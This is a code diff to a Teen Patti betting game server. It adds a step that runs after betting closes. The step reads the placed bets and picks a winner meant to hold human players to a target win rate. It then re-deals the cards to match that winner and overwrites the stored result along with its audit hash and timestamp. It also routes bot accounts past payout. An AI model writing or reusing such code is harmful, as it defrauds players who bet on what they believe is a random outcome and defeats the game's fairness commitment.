@@ -14,15 +14,20 @@ import type { WalletBalanceUpdatedPayload } from '@/modules/wallet/wallet.types'
 import {
   TEEN_PATTI_GAME_CODE,
   TEEN_PATTI_RNG_ALGORITHM_VERSION,
+  TEEN_PATTI_RNG_ALGORITHM_VERSION_BIASED,
   TEEN_PATTI_SOCKET_ROOM,
 } from '@/modules/teen-patti/teen-patti.constant';
 import { effectiveTeenPattiResultDurationMs } from '@/modules/teen-patti/teen-patti.config';
-import { dealUniqueWinner } from '@/modules/teen-patti/teen-patti.deal';
+import { dealUniqueWinner, dealWithWinningOption } from '@/modules/teen-patti/teen-patti.deal';
 import { splitPot } from '@/modules/teen-patti/teen-patti.payout';
 import { buildTeenPattiPreview } from '@/modules/teen-patti/teen-patti.public';
 import { buildTeenPattiResultCommitment } from '@/modules/teen-patti/teen-patti.audit';
 import { withSerializableRetry } from '@/modules/greedy/greedy.utils';
 import { logger } from '@/utils/logger';
+import { pickBiasedWinner, pickNaturalWinner } from '@/modules/game-bot/biased-outcome';
+import { loadTeenPattiRoundBets } from '@/modules/game-bot/biased-round';
+import { getGameBotPolicy } from '@/modules/game-bot/bot-policy';
+import { isBotUserIdSync } from '@/modules/game-bot/bot-identity';
 
 const SETTLEMENT_BATCH_USERS = 50;
 const REFUND_BATCH_USERS = 50;
@@ -216,6 +221,125 @@ const lockRound = async (round_id: string): Promise<void> => {
   });
 
   if (locked_at) await cacheRound(round_id);
+};
+
+const applyBiasedResultAtLock = async (round_id: string): Promise<void> => {
+  const round = await prisma.teenPattiRound.findUnique({
+    where: { id: round_id },
+    include: {
+      config_version: {
+        include: { options: { where: { is_enabled: true }, orderBy: { display_order: 'asc' } } },
+      },
+      result: true,
+    },
+  });
+  if (
+    !round ||
+    round.status !== TeenPattiRoundStatus.betting_locked ||
+    !round.result ||
+    !round.locked_at ||
+    round.result.generated_at >= round.locked_at
+  ) {
+    return;
+  }
+
+  const options = round.config_version.options;
+  if (options.length !== 3) {
+    throw new Error('Teen Patti config must have exactly three enabled decks');
+  }
+
+  const round_bets = await loadTeenPattiRoundBets(round.id);
+  const pot = round_bets.reduce((sum, bet) => sum + bet.amount, 0n);
+  const distributable =
+    pot - (pot * BigInt(round.config_version.rake_bps)) / 10000n;
+  const biased_options = options.map((option) => {
+    const stake_on_option = round_bets
+      .filter((bet) => bet.option_id === option.id)
+      .reduce((sum, bet) => sum + bet.amount, 0n);
+    return {
+      id: option.id,
+      probability_weight: 1n,
+      payout_numerator: distributable > 0n ? distributable : 1n,
+      payout_denominator: stake_on_option > 0n ? stake_on_option : 1n,
+    };
+  });
+
+  const policy = await getGameBotPolicy();
+  const biased = policy.enabled
+    ? pickBiasedWinner({
+        options: biased_options,
+        bets: round_bets,
+        target_human_win_rate: policy.target_human_win_rate,
+        min_human_bets_before_bias: policy.min_human_bets_before_bias,
+      })
+    : pickNaturalWinner(biased_options);
+
+  const deal = dealWithWinningOption(
+    options.map((option) => ({ id: option.id, code: option.code })),
+    biased.option_id,
+  );
+  const winner = deal.hands[deal.winner_index];
+  if (!winner) throw new Error('Teen Patti biased deal produced no winner');
+
+  const database_now_rows = await prisma.$queryRaw<Array<{ database_now: Date }>>(
+    Prisma.sql`SELECT CURRENT_TIMESTAMP AS database_now`,
+  );
+  const database_now = database_now_rows[0]?.database_now;
+  if (!database_now) throw new Error('Database time unavailable');
+
+  const hands = deal.hands.map((hand) => ({
+    option_id: hand.option_id,
+    option_code: hand.option_code,
+    cards: hand.cards,
+    category: hand.category,
+    rank_key: hand.rank_key,
+  }));
+  const algorithm_version =
+    biased.algorithm_suffix === 'biased-v1'
+      ? TEEN_PATTI_RNG_ALGORITHM_VERSION_BIASED
+      : TEEN_PATTI_RNG_ALGORITHM_VERSION;
+  const audit_hash = buildTeenPattiResultCommitment({
+    round_id: round.id,
+    config_version_id: round.config_version_id,
+    winning_option_id: winner.option_id,
+    algorithm_version,
+    entropy_digest: deal.entropy_digest,
+    hands,
+    generated_at: database_now,
+  });
+
+  await withSerializableRetry(async (tx) => {
+    const current = await tx.teenPattiRound.findUnique({
+      where: { id: round.id },
+      include: { result: true },
+    });
+    if (
+      !current ||
+      current.status !== TeenPattiRoundStatus.betting_locked ||
+      !current.result ||
+      !current.locked_at ||
+      current.result.generated_at >= current.locked_at
+    ) {
+      return;
+    }
+
+    await tx.teenPattiRoundResult.update({
+      where: { round_id: round.id },
+      data: {
+        winning_option_version_id: winner.option_id,
+        algorithm_version,
+        entropy_digest: deal.entropy_digest,
+        audit_hash,
+        deal_attempt_count: deal.deal_attempt_count,
+        hands,
+        generated_at: database_now,
+      },
+    });
+    await tx.teenPattiRound.update({
+      where: { id: round.id },
+      data: { result_generated_at: database_now },
+    });
+  });
 };
 
 const startDrawingAfterLock = async (round_id: string): Promise<boolean> => {
@@ -607,7 +731,7 @@ const settleUser = async (round_id: string, user_id: string): Promise<void> => {
       };
     });
 
-    if (total_payout <= 0n) {
+    if (total_payout <= 0n || isBotUserIdSync(user_id)) {
       await tx.teenPattiBetSettlement.createMany({
         data: settlement_rows,
         skipDuplicates: true,
@@ -906,6 +1030,7 @@ const processCurrentRound = async (
       await lockRound(round.id);
       break;
     case TeenPattiRoundStatus.betting_locked:
+      await applyBiasedResultAtLock(round.id);
       await startDrawingAfterLock(round.id);
       break;
     case TeenPattiRoundStatus.result_ready:
